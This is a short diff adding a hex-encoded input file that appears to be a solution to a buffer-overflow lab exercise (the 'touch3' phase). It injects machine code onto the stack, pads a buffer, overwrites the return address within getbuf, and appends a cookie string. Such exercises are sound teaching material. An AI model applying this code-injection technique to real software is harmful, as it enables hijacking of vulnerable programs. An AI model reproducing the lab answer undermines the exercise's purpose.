@@ -1,0 +1,10 @@
+/* assem injecting address of stack pointer inside touch3 */
+48 c7 c7 c8 94 56 55 c3
+/* buffer */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* rsp location inside getbuf */
+a0 94 56 55 00 00 00 00
+/* touch3 */
+25 1f 40 00 00 00 00 00
+/* cookie as string literal */
+33 32 30 34 36 33 30 31 00
